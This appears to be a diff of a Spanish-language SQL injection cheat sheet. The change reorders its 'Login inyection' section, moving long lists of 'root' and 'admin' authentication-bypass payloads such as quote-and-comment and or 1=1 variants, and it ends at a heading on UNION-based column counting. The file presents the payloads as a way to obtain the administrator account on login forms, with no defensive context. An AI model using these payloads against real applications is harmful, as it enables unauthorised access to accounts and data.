@@ -8,27 +8,6 @@ This is how SQL Injection works:
 ### 1- Login inyection
 Estos payloads hacen referencia inyeciones de consultas de sql, tambien se pueden usar en los logins para conseguir el usuario de administrador generalmente.
 ```bash
-root' --
-root' #
-root'/*
-root' or '1'='1
-root' or '1'='1'--
-root' or '1'='1'#
-root' or '1'='1'/*
-root'or 1=1 or ''='
-root' or 1=1
-root' or 1=1--
-root' or 1=1#
-root' or 1=1/*
-root') or ('1'='1
-root') or ('1'='1'--
-root') or ('1'='1'#
-root') or ('1'='1'/*
-root') or '1'='1
-root') or '1'='1'--
-root') or '1'='1'#
-root') or '1'='1'/*
-
 or 1=1
 or 1=1--
 or 1=1#
@@ -43,28 +22,11 @@ or 1=1/*
 " or 1=1#
 " or 1=1/*
 
+---
+
 1' or '1'='1
 
-root" --
-root" #
-root"/*
-root" or "1"="1
-root" or "1"="1"--
-root" or "1"="1"#
-root" or "1"="1"/*
-root" or 1=1 or ""="
-root" or 1=1
-root" or 1=1--
-root" or 1=1#
-root" or 1=1/*
-root") or ("1"="1
-root") or ("1"="1"--
-root") or ("1"="1"#
-root") or ("1"="1"/*
-root") or "1"="1
-root") or "1"="1"--
-root") or "1"="1"#
-root") or "1"="1"/*
+---
 
 admin' --
 admin' #
@@ -108,6 +70,50 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+
+---
+
+root' --
+root' #
+root'/*
+root' or '1'='1
+root' or '1'='1'--
+root' or '1'='1'#
+root' or '1'='1'/*
+root'or 1=1 or ''='
+root' or 1=1
+root' or 1=1--
+root' or 1=1#
+root' or 1=1/*
+root') or ('1'='1
+root') or ('1'='1'--
+root') or ('1'='1'#
+root') or ('1'='1'/*
+root') or '1'='1
+root') or '1'='1'--
+root') or '1'='1'#
+root') or '1'='1'/*
+
+root" --
+root" #
+root"/*
+root" or "1"="1
+root" or "1"="1"--
+root" or "1"="1"#
+root" or "1"="1"/*
+root" or 1=1 or ""="
+root" or 1=1
+root" or 1=1--
+root" or 1=1#
+root" or 1=1/*
+root") or ("1"="1
+root") or ("1"="1"--
+root") or ("1"="1"#
+root") or ("1"="1"/*
+root") or "1"="1
+root") or "1"="1"--
+root") or "1"="1"#
+root") or "1"="1"/*
 ```
 ------------------------------------------
 ### 2- Determinar el número de columnas necesarias en un ataque UNION de inyección SQL
